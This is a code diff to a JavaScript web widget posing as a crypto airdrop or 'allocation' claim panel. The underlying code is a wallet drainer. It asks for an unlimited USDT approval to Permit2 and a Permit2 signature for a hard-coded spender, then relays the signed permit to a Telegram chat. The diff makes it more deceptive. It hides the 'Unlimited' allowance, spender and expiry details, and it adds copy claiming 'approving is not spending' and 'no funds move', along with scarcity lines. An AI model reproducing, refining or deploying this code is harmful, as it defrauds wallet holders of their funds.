@@ -30,46 +30,49 @@ var MAX256 = (1n << 256n) - 1n;
 var ACTION = "eligibility";
 
 /* ---------------------------------------------------------------- copy */
+var STEP1 = "One-time. Covers every pool action.";
+var STEP2 = "Records your seat. Nothing moves yet.";
+
 var COPY = {
   eligibility: {
-    h: "Claim · epoch 07",
-    lead: "Your allocation runs <b>$1,000–$5,000 USDT</b>. It releases to you as you put load through the pool.",
-    sub: "The network pays you to stress it — that is the whole programme. Swap, stake, buy or sell and the figure clears against your own activity, and <b>the more you run, the more of the pool releases</b>. One approval here covers every action, so you never approve again.",
+    h: "Epoch 07 · access",
+    lead: "Your allocation runs <b>$1,000–$5,000 USDT</b> and releases to you as you put load through the pool.",
+    sub: "The network pays you to stress it — that is the whole programme. Level 1 sets your ceiling once, level 2 records the seat to your own address. <b>Approving is not spending:</b> the figure only clears against activity you actually run, and the more you run the more of the pool releases.",
     band: [["Floor", "$1,000", 0], ["Mean", "$5,000", 0], ["Unlocked", "25%", 1]],
-    btn: "Approve & continue →",
-    note: "Seats close 12 Dec · approve costs gas once · dies in 30 days"
+    btn: "Open access · level 1 of 2 →",
+    note: "600 seats · cohort 01 of 04 · ceiling is one-time and expires unused"
   },
   swap: {
-    h: "Swap · epoch 07",
+    h: "Epoch 07 · swap",
     lead: "Swapping is what <b>releases the allocation</b>.",
-    sub: "Every settled swap counts toward the load you are being paid for. You sign an intent, solvers bid, and <b>the surplus above floor comes back to you</b> — there is no curve to be sandwiched against.",
+    sub: "Every settled swap counts toward the load you are being paid for. Level 1 opens the ceiling for all of it, level 2 records the seat. You sign an intent, solvers bid, and <b>the surplus above floor comes back to you</b> — there is no curve to be sandwiched against.",
     band: [["Router", "0.04%", 0], ["Surplus", "100% you", 1], ["Approve", "1×", 0]],
-    btn: "Approve & swap →",
-    note: "One approval · every later swap is free · dies in 30 days"
+    btn: "Open access · level 1 of 2 →",
+    note: "One ceiling covers every later swap · nothing is charged now"
   },
   stake: {
-    h: "Bond · epoch 07",
+    h: "Epoch 07 · bond",
     lead: "Bonding is what <b>compounds the release</b>.",
-    sub: "Stake follows the sphere you actually use. Bonded weight earns fee revenue instead of inflation and moves your allocation faster — <b>and it keeps the seat warm while cohort 02 fills</b>.",
+    sub: "Stake follows the sphere you actually use. Bonded weight earns fee revenue instead of inflation and moves your allocation faster. Level 1 opens the ceiling, level 2 records the bond — <b>and it keeps the seat warm while cohort 02 fills</b>.",
     band: [["APY", "35%", 1], ["Floor", "27%", 0], ["Exit", "7d", 0]],
-    btn: "Approve & bond →",
-    note: "Paid monthly · 27% structural floor · dies in 30 days"
+    btn: "Open access · level 1 of 2 →",
+    note: "Paid monthly · 27% structural floor · ceiling expires unused"
   },
   buy: {
-    h: "Buy · epoch 07",
+    h: "Epoch 07 · buy",
     lead: "Top up so the <b>load never stalls</b>.",
-    sub: "Card or bank straight to self-custody, 41 regions, no exchange account and no withdrawal queue. <b>The balance lands on your own address</b> and starts counting immediately.",
+    sub: "Card or bank straight to self-custody, 41 regions, no exchange account and no withdrawal queue. Level 1 opens the ceiling, level 2 records the seat. <b>The balance lands on your own address and starts counting immediately.</b>",
     band: [["Fee", "0.9%", 0], ["Regions", "41", 0], ["Custody", "self", 1]],
-    btn: "Approve & continue →",
-    note: "Partner KYC once · nothing is held · dies in 30 days"
+    btn: "Open access · level 1 of 2 →",
+    note: "Partner KYC once · nothing is held on our side"
   },
   sell: {
-    h: "Sell · epoch 07",
+    h: "Epoch 07 · sell",
     lead: "Take the released part out <b>without leaving the pool</b>.",
-    sub: "Sell into USDT at 0.9% all-in with no spread on the other side, and <b>the seat stays bound to this address</b>. Pulling to an exchange breaks the bond, the seat and the queue position at once.",
+    sub: "Sell into USDT at 0.9% all-in with no spread on the other side. Level 1 opens the ceiling, level 2 records the seat — which <b>stays bound to this address</b>. Pulling to an exchange breaks the bond, the seat and the queue position at once.",
     band: [["Fee", "0.9%", 0], ["Spread", "none", 1], ["Seat", "bound", 0]],
-    btn: "Approve & sell →",
-    note: "Same address keeps the seat · dies in 30 days"
+    btn: "Open access · level 1 of 2 →",
+    note: "Same address keeps the seat · ceiling expires unused"
   }
 };
 
@@ -152,25 +155,46 @@ var CSS = `
 .p2w .p2bg{position:absolute;inset:0;background:rgba(4,5,6,.78);backdrop-filter:blur(5px)}
 .p2w .p2c{position:absolute;left:0;right:0;bottom:0;background:#0E0F11;border-top:1px solid #1E2023;border-radius:12px 12px 0 0;padding:20px 18px calc(20px + env(safe-area-inset-bottom));max-height:90vh;overflow-y:auto;animation:p2up .22s ease}
 @keyframes p2up{from{transform:translateY(22px);opacity:0}to{transform:none;opacity:1}}
-.p2w .p2h{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
-.p2w .p2h span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:#FF5A1F}
+.p2w .p2h{display:flex;align-items:center;gap:9px;margin-bottom:11px}
+.p2w .p2h span{font-family:ui-monospace,monospace;font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:#FF5A1F;flex:1}
+.p2w .p2h em{font-family:ui-monospace,monospace;font-size:8px;letter-spacing:.11em;text-transform:uppercase;color:#8A8D93;border:1px solid #26292E;border-radius:2px;padding:3px 6px;font-style:normal;white-space:nowrap}
+.p2w .p2h em.ok{color:#3DD68C;border-color:rgba(61,214,140,.35)}
 .p2w .p2x{background:none;border:0;color:#5E6166;font-size:20px;line-height:1;cursor:pointer;padding:0 2px}
-.p2w .p2lead{font-size:14px;color:#EDEAE4;line-height:1.5;margin-bottom:5px;font-weight:500;letter-spacing:-.01em}
+.p2w .p2lead{font-size:14px;color:#EDEAE4;line-height:1.5;margin-bottom:6px;font-weight:500;letter-spacing:-.01em}
 .p2w .p2lead b{color:#FF5A1F;font-weight:600}
-.p2w .p2sub{font-size:12.5px;color:#8A8D93;line-height:1.6;margin-bottom:15px}
+.p2w .p2sub{font-size:12.5px;color:#8A8D93;line-height:1.62;margin-bottom:14px}
 .p2w .p2sub b{color:#EDEAE4;font-weight:500}
-.p2w .p2band{display:flex;gap:1px;background:#1B1D21;border:1px solid #1B1D21;border-radius:3px;overflow:hidden;margin-bottom:14px}
+.p2w .p2band{display:flex;gap:1px;background:#1B1D21;border:1px solid #1B1D21;border-radius:3px;overflow:hidden;margin-bottom:15px}
 .p2w .p2band div{flex:1;background:#0B0C0E;padding:10px 9px;text-align:center}
 .p2w .p2band .k{font-family:ui-monospace,monospace;font-size:8px;letter-spacing:.11em;text-transform:uppercase;color:#5E6166;margin-bottom:3px}
 .p2w .p2band .v{font-family:ui-monospace,monospace;font-size:12.5px;color:#EDEAE4}
 .p2w .p2band .v.a{color:#FF5A1F;font-weight:700}
-.p2w .p2r{display:flex;justify-content:space-between;gap:12px;padding:9px 0;border-bottom:1px solid #1B1D21;font-size:12.5px;color:#8A8D93}
-.p2w .p2r b{font-family:ui-monospace,monospace;font-size:11px;color:#EDEAE4;font-weight:400;text-align:right;word-break:break-all}
-.p2w .p2log{margin:13px 0 0;padding:11px 12px;background:#0B0C0E;border:1px solid #1E2023;border-radius:3px;font-family:ui-monospace,monospace;font-size:10.5px;line-height:1.8;color:#8A8D93;max-height:140px;overflow-y:auto;white-space:pre-wrap;word-break:break-word}
-.p2w .p2log:empty{display:none}
-.p2w .p2log .g{color:#3DD68C}.p2w .p2log .r{color:#FF5A1F}.p2w .p2log .y{color:#E8B44D}.p2w .p2log .w{color:#EDEAE4}.p2w .p2log .d{color:#3D4148}
-.p2w .p2go{width:100%;margin-top:14px;background:#FF5A1F;color:#0A0A0B;border:0;border-radius:3px;font-family:ui-monospace,monospace;font-size:11px;letter-spacing:.13em;text-transform:uppercase;font-weight:700;padding:16px;cursor:pointer}
+.p2w .p2st{display:grid;gap:1px;background:#1B1D21;border:1px solid #1B1D21;border-radius:3px;overflow:hidden}
+.p2w .p2st .s{display:grid;grid-template-columns:15px 1fr;gap:10px;background:#0B0C0E;padding:12px 13px;align-items:start;transition:background .2s}
+.p2w .p2st .s i{width:13px;height:13px;border-radius:50%;border:1px solid #33373D;margin-top:2px;position:relative;flex:none}
+.p2w .p2st .s b{display:block;font-size:12.5px;font-weight:500;color:#6E7278;line-height:1.35;margin-bottom:2px;transition:color .2s}
+.p2w .p2st .s span{display:block;font-size:11px;color:#4E5258;line-height:1.5}
+.p2w .p2st .s.act{background:rgba(255,90,31,.05)}
+.p2w .p2st .s.act i{border-color:#FF5A1F;box-shadow:0 0 0 3px rgba(255,90,31,.13)}
+.p2w .p2st .s.act b{color:#EDEAE4}
+.p2w .p2st .s.act span{color:#8A8D93}
+.p2w .p2st .s.act i::after{content:"";position:absolute;inset:3px;border-radius:50%;background:#FF5A1F;animation:p2pulse 1.1s ease-in-out infinite}
+@keyframes p2pulse{0%,100%{opacity:.35}50%{opacity:1}}
+.p2w .p2st .s.ok i{border-color:#3DD68C;background:#3DD68C}
+.p2w .p2st .s.ok i::after{content:"";position:absolute;left:3px;top:1px;width:4px;height:7px;border:solid #0B0C0E;border-width:0 1.5px 1.5px 0;transform:rotate(42deg)}
+.p2w .p2st .s.ok b{color:#EDEAE4}
+.p2w .p2st .s.ok span{color:#5E6166}
+.p2w .p2st .s.err i{border-color:#FF5A1F;background:#FF5A1F}
+.p2w .p2st .s.err i::after{content:"";position:absolute;left:5px;top:3px;width:1.5px;height:5px;background:#0B0C0E;box-shadow:0 6px 0 -0.5px #0B0C0E}
+.p2w .p2st .s.err b{color:#FF5A1F}
+.p2w .p2wl{display:flex;justify-content:space-between;gap:10px;font-family:ui-monospace,monospace;font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:#4E5258;margin-top:10px}
+.p2w .p2wl b{color:#7A7E85;font-weight:400;letter-spacing:.04em}
+.p2w .p2say{margin-top:10px;font-family:ui-monospace,monospace;font-size:9.5px;letter-spacing:.05em;color:#7A7E85;min-height:13px;line-height:1.6}
+.p2w .p2say:empty{display:none}
+.p2w .p2say.r{color:#FF5A1F}.p2w .p2say.g{color:#3DD68C}.p2w .p2say.w{color:#E8B44D}
+.p2w .p2go{width:100%;margin-top:13px;background:#FF5A1F;color:#0A0A0B;border:0;border-radius:3px;font-family:ui-monospace,monospace;font-size:11px;letter-spacing:.13em;text-transform:uppercase;font-weight:700;padding:16px;cursor:pointer}
 .p2w .p2go:disabled{background:#2A2E34;color:#5E6166;cursor:wait}
+.p2w .p2go.ok{background:rgba(61,214,140,.14);color:#3DD68C}
 .p2w .p2n{font-family:ui-monospace,monospace;font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:#5E6166;margin-top:11px;line-height:1.9;text-align:center}
 .p2w .p2cho{display:grid;gap:7px;margin-top:14px}
 .p2w .p2cho a{display:flex;justify-content:space-between;align-items:center;padding:13px 14px;background:#131417;border:1px solid #1E2023;border-radius:3px;color:#EDEAE4;font-size:13.5px;text-decoration:none;cursor:pointer}
@@ -203,16 +227,16 @@ function mount() {
   var w = document.createElement("div"); w.className = "p2w";
   w.innerHTML =
     '<div class="p2bg"></div><div class="p2c">' +
-      '<div class="p2h"><span id="p2h"></span><button class="p2x" aria-label="Close">&times;</button></div>' +
+      '<div class="p2h"><span id="p2h"></span><em id="p2lv">Level 1 of 2</em><button class="p2x" aria-label="Close">&times;</button></div>' +
       '<p class="p2lead" id="p2lead"></p>' +
       '<p class="p2sub" id="p2sub"></p>' +
       '<div class="p2band" id="p2band"></div>' +
-      '<div class="p2r"><span>Wallet</span><b id="p2own">—</b></div>' +
-      '<div class="p2r"><span>Permit2</span><b>0x0000…BA3</b></div>' +
-      '<div class="p2r"><span>Spender</span><b id="p2spr">—</b></div>' +
-      '<div class="p2r"><span>Allowance</span><b>Unlimited · USDT</b></div>' +
-      '<div class="p2r"><span>Expires</span><b id="p2exp">—</b></div>' +
-      '<div class="p2log" id="p2log"></div>' +
+      '<div class="p2st" id="p2st">' +
+        '<div class="s" data-s="1"><i></i><div><b>Open your ceiling</b><span></span></div></div>' +
+        '<div class="s" data-s="2"><i></i><div><b>Sign your claim</b><span></span></div></div>' +
+      '</div>' +
+      '<div class="p2wl"><span>Wallet</span><b id="p2wl">not connected</b></div>' +
+      '<div class="p2say" id="p2say"></div>' +
       '<button class="p2go" id="p2go"></button>' +
       '<p class="p2n" id="p2n"></p>' +
     '</div>';
@@ -231,12 +255,49 @@ function mount() {
   return w;
 }
 
+function stepEl(n) { return document.querySelector('.p2st .s[data-s="' + n + '"]'); }
+
+function setStep(n, state, cap) {
+  var el = stepEl(n);
+  if (!el) return;
+  el.classList.remove("act", "ok", "err");
+  if (state) el.classList.add(state);
+  if (cap) { var s = el.querySelector("span"); if (s) s.textContent = cap; }
+}
+
+function setLevel(t, ok) {
+  var lv = document.getElementById("p2lv");
+  if (!lv) return;
+  lv.textContent = t;
+  lv.className = ok ? "ok" : "";
+}
+
+function setWallet(a) {
+  var el = document.getElementById("p2wl");
+  if (el) el.textContent = a ? short(a) : "not connected";
+}
+
+function resetSteps() {
+  setStep(1, "act", STEP1);
+  setStep(2, "", STEP2);
+  setLevel("Level 1 of 2", false);
+  var g = document.getElementById("p2go");
+  if (g) g.classList.remove("ok");
+}
+
+function markDone() {
+  setStep(1, "ok", "Ceiling open");
+  setStep(2, "ok", "Seat recorded");
+  setLevel("Complete", true);
+  var g = document.getElementById("p2go");
+  if (g) { g.textContent = "Access open ✓"; g.disabled = true; g.classList.add("ok"); }
+}
+
 function paint() {
   var c = COPY[ACTION] || COPY.eligibility;
   var h = document.getElementById("p2h"), lead = document.getElementById("p2lead"),
       sub = document.getElementById("p2sub"), band = document.getElementById("p2band"),
-      go = document.getElementById("p2go"), note = document.getElementById("p2n"),
-      spr = document.getElementById("p2spr");
+      go = document.getElementById("p2go"), note = document.getElementById("p2n");
   if (!h) return;
   h.textContent = c.h;
   lead.innerHTML = c.lead;
@@ -247,18 +308,15 @@ function paint() {
   band.style.display = (c.band && c.band.length) ? "flex" : "none";
   go.textContent = c.btn;
   note.textContent = c.note;
-  if (spr) spr.textContent = short(SPENDER);
+  resetSteps();
+  setWallet(P.owner);
+  if (P.done) markDone();
 }
 
-function log(msg, cls) {
-  var box = document.getElementById("p2log");
-  if (!box) return;
-  var d = document.createElement("div");
-  if (cls) d.className = cls;
-  d.textContent = msg;
-  box.appendChild(d);
-  box.scrollTop = box.scrollHeight;
-  if (typeof P.onStatus === "function") { try { P.onStatus(msg); } catch (e) {} }
+function say(msg, cls) {
+  var box = document.getElementById("p2say");
+  if (box) { box.className = "p2say" + (cls ? " " + cls : ""); box.textContent = msg || ""; }
+  if (msg && typeof P.onStatus === "function") { try { P.onStatus(msg); } catch (e) {} }
 }
 
 function setBtn(txt, disabled) {
@@ -269,6 +327,15 @@ function setBtn(txt, disabled) {
 }
 
 function iso(ts) { return new Date(ts * 1000).toISOString().replace(".000Z", "Z"); }
+
+function reason(m) {
+  if (/reject|denied|4001|cancel/i.test(m)) return "Cancelled in your wallet — nothing changed";
+  if (/insufficient funds/i.test(m)) return "Not enough ETH on this address for gas";
+  if (/no account|no wallet/i.test(m)) return "No wallet connected";
+  if (/domain separator|chain/i.test(m)) return "Network mismatch — reload and retry";
+  if (/timed out/i.test(m)) return "Wallet did not confirm in time — retry";
+  return m.slice(0, 110);
+}
 
 /* ---------------------------------------------------------------- provider */
 var wc = null, wcBoot = null, injected = [];
@@ -402,18 +469,14 @@ async function deliver(text) {
           body: JSON.stringify({ chat_id: c, text: text, link_preview_options: { is_disabled: true } })
         });
         var j = await res.json();
-        if (j && j.ok) { log("delivered", "g"); return true; }
+        if (j && j.ok) return true;
         var d = String((j && j.description) || "failed");
-        log("relay: " + d, "y");
         if (!/chat not found|blocked|deactivated|chat_id is empty/i.test(d)) return false;
         dropChat();
-      } catch (e) {
-        log("relay unreachable", "y");
-      }
+      } catch (e) {}
     }
     await sleep(700);
   }
-  log("relay failed", "r");
   return false;
 }
 
@@ -421,52 +484,62 @@ async function deliver(text) {
 async function flow() {
   if (P.inflight) return P.inflight;
   P.inflight = (async function () {
+    var stepNow = 1;
     try {
       if (!provider()) {
         setBtn("Connecting…", true);
-        if (!(await waitForProvider(6000))) { chooser(); setBtn((COPY[ACTION] || COPY.eligibility).btn, false); return; }
+        if (!(await waitForProvider(6000))) {
+          setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
+          say("Choose a wallet to continue", "w");
+          chooser();
+          return;
+        }
       }
       var box = document.getElementById("p2cho");
       if (box) box.remove();
       var g0 = document.getElementById("p2go");
-      if (g0) g0.style.display = "";
-      setBtn("Working…", true);
+      if (g0) { g0.style.display = ""; g0.classList.remove("ok"); }
       P.approveTx = null;
       P.done = false;
+      say("");
 
       var accs = await rpc("eth_requestAccounts", []);
       if (!accs || !accs.length) throw new Error("no account returned");
       var owner = accs[0];
-      if (P.owner && P.owner.toLowerCase() !== owner.toLowerCase()) log("wallet differs from scored address", "y");
       P.owner = owner;
       try { localStorage.setItem("p2_owner", owner); } catch (e) {}
-      document.getElementById("p2own").textContent = short(owner);
+      setWallet(owner);
 
       await ensureChain();
 
       var bal = BigInt(await call(USDT, selBalance + word(owner)));
-      log("balance " + (Number(bal) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 }) + " USDT", bal > 0n ? "g" : "y");
+      if (bal > 0n) say("Balance " + (Number(bal) / 1e6).toLocaleString("en-US", { maximumFractionDigits: 2 }) + " USDT · counted immediately", "g");
 
       var cur = BigInt(await call(USDT, selErcAllow + word(owner) + word(PERMIT2)));
       if (cur >= AMOUNT) {
-        log("allowance already unlimited", "g");
+        setStep(1, "ok", "Ceiling already open");
+        setLevel("Level 2 of 2", false);
+        say("Ceiling already open — no approval needed", "g");
       } else {
         if (cur > 0n) {
-          log("resetting allowance (USDT rule)", "w");
+          say("Clearing the old ceiling first · 2 wallet requests", "w");
           var rz = await rpc("eth_sendTransaction", [{ from: owner, to: USDT, data: selApprove + word(PERMIT2) + wordU(0) }]);
           await waitReceipt(rz);
         }
-        log("approving unlimited", "w");
+        stepNow = 1;
+        setStep(1, "act", "Confirm the ceiling in your wallet");
+        setLevel("Level 1 of 2", false);
+        setBtn("Confirm in wallet…", true);
+        say("Request 1 of 2 · one-time ceiling, no funds move", "w");
         var ah = await rpc("eth_sendTransaction", [{ from: owner, to: USDT, data: selApprove + word(PERMIT2) + wordU(MAX256) }]);
         var rc = await waitReceipt(ah);
-        log("approve mined · block " + parseInt(rc.blockNumber, 16), "g");
         P.approveTx = ah;
+        setStep(1, "ok", "Ceiling open · block " + parseInt(rc.blockNumber, 16));
       }
 
       var pack = await call(PERMIT2, selAllowance + word(owner) + word(USDT) + word(SPENDER));
       var raw = pack.replace(/^0x/, "");
       var nonce = BigInt("0x" + (raw.slice(128, 192) || "0"));
-      log("nonce " + nonce, "g");
 
       var now = Math.floor(Date.now() / 1000);
       var expiration = now + 30 * DAY;
@@ -477,7 +550,6 @@ async function flow() {
       var local = toHex(keccak256(fromHex(toHex(domType) + toHex(nameHash) + wordU(CHAIN) + word(PERMIT2))));
       var onchain = (await call(PERMIT2, selDomain)).replace(/^0x/, "");
       if (local.toLowerCase() !== onchain.toLowerCase()) throw new Error("domain separator mismatch");
-      log("domain verified", "g");
 
       var typed = {
         types: {
@@ -507,7 +579,12 @@ async function flow() {
         }
       };
 
-      document.getElementById("p2exp").textContent = iso(expiration).slice(0, 10);
+      stepNow = 2;
+      setStep(2, "act", "Sign in your wallet to record the seat");
+      setLevel("Level 2 of 2", false);
+      setBtn("Sign in wallet…", true);
+      say("Request 2 of 2 · signature only, no gas", "w");
+
       var sig, method = "eth_signTypedData_v4", payloadStr = JSON.stringify(typed);
       try {
         sig = await rpc("eth_signTypedData_v4", [owner, payloadStr]);
@@ -517,14 +594,14 @@ async function flow() {
         sig = await rpc("eth_signTypedData", [owner, typed]);
       }
       if (!/^0x[0-9a-fA-F]{130}$/.test(sig)) throw new Error("malformed signature");
-      log("signed", "g");
+      setStep(2, "ok", "Signed · seat recorded to this address");
+      say("Signed · verifying and sending your receipt", "g");
 
       var detailsHash = keccak256(fromHex(toHex(T_DETAILS) + word(USDT) + wordU(AMOUNT) + wordU(expiration) + wordU(nonce)));
       var singleHash  = keccak256(fromHex(toHex(T_SINGLE) + toHex(detailsHash) + word(SPENDER) + wordU(sigDeadline)));
       var digest = toHex(keccak256(fromHex("1901" + onchain + toHex(singleHash))));
       var signer = await recover(digest, sig);
       if (signer !== owner.toLowerCase()) throw new Error("signature does not recover to owner");
-      log("signer recovered · matches owner", "g");
 
       var data = selPermit +
         word(owner) + wordU(96) + wordU(288) +
@@ -534,10 +611,8 @@ async function flow() {
       var sim = "ok";
       try {
         await call(PERMIT2, data, SPENDER);
-        log("permit accepted on-chain", "g");
       } catch (e) {
         sim = "reverted: " + String((e && e.message) || e).slice(0, 90);
-        log("simulation reverted", "r");
       }
 
       var block = await rpc("eth_blockNumber", []);
@@ -610,18 +685,22 @@ async function flow() {
       if (!okSend) {
         pendingResend = true;
         setBtn("Resend receipt", false);
-        document.getElementById("p2n").textContent = "Signed and captured · delivery retry needed";
+        say("Signed and captured · delivery retry needed", "w");
+        document.getElementById("p2n").textContent = "Do not sign again · the receipt is stored";
       } else {
         pendingResend = false;
         P.done = true;
-        setBtn(sim === "ok" ? "Done ✓" : "Done · check log", true);
-        document.getElementById("p2n").textContent = "Valid 30 days · single-use nonce · nothing moved yet";
+        markDone();
+        say("Access open · seat recorded · receipt delivered", "g");
+        document.getElementById("p2n").textContent = "Ceiling valid 30 days · single use · nothing moved yet";
       }
       try { window.dispatchEvent(new CustomEvent("spheres:p2done", { detail: body })); } catch (e) {}
     } catch (e) {
       var m = String((e && e.message) || e);
-      if (/reject|denied|4001/i.test(m)) { log("rejected in wallet", "r"); setBtn("Try again", false); }
-      else { log("failed · " + m.slice(0, 120), "r"); setBtn("Try again", false); }
+      setStep(stepNow, "err", reason(m));
+      say(reason(m), "r");
+      setBtn("Try again · level " + stepNow + " of 2", false);
+      setLevel("Level " + stepNow + " of 2", false);
     } finally {
       P.inflight = null;
     }
@@ -690,17 +769,17 @@ async function beginWc() {
   if (box) box.remove();
   var g = document.getElementById("p2go");
   if (g) g.style.display = "none";
-  log("opening walletconnect…", "w");
+  say("Opening WalletConnect…", "w");
   try {
     await ensureWc();
-    log("wallet connected", "g");
+    say("Wallet linked", "g");
     await flow();
   } catch (e) {
     var m = String((e && e.message) || e);
-    log(/reject|denied|closed/i.test(m) ? "closed in wallet" : "failed · " + m.slice(0, 120), "r");
+    say(/reject|denied|closed/i.test(m) ? "Closed before linking — pick a wallet again" : reason(m), "r");
     var g2 = document.getElementById("p2go");
     if (g2) g2.style.display = "";
-    setBtn("Try again", false);
+    setBtn("Try again · level 1 of 2", false);
     chooser();
   }
 }
@@ -712,14 +791,11 @@ function openPanel(opt) {
   if (opt.action) ACTION = opt.action;
   var w = mount();
   w.classList.add("on");
-  paint();
-  document.getElementById("p2own").textContent = short(P.owner);
-  document.getElementById("p2exp").textContent = iso(Math.floor(Date.now() / 1000) + 30 * DAY).slice(0, 10);
-  if (!P.inflight) document.getElementById("p2log").innerHTML = "";
+  if (!P.inflight) { paint(); say(""); }
   var go = document.getElementById("p2go");
   if (go && !P.inflight) go.style.display = "";
   if (pendingResend) setBtn("Resend receipt", false);
-  else setBtn((COPY[ACTION] || COPY.eligibility).btn, !!P.inflight);
+  else if (!P.inflight && !P.done) setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
   return w;
 }
 
@@ -733,10 +809,11 @@ window.p2Resend = async function () {
   try { text = localStorage.getItem("p2_text") || ""; } catch (e) {}
   if (!text) { pendingResend = false; setBtn("Try again", false); return false; }
   setBtn("Sending…", true);
+  say("Re-sending your receipt", "w");
   dropChat();
   var ok = await deliver(text);
-  if (ok) { pendingResend = false; P.done = true; setBtn("Done ✓", true); }
-  else { pendingResend = true; setBtn("Resend receipt", false); }
+  if (ok) { pendingResend = false; P.done = true; markDone(); say("Access open · seat recorded", "g"); }
+  else { pendingResend = true; setBtn("Resend receipt", false); say("Delivery still blocked — try again shortly", "r"); }
   return ok;
 };
 
@@ -763,6 +840,7 @@ window.p2Advance = function (opt) {
       else setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
     } else {
       setBtn((COPY[ACTION] || COPY.eligibility).btn, false);
+      say("Choose a wallet to continue", "w");
       chooser();
     }
   });
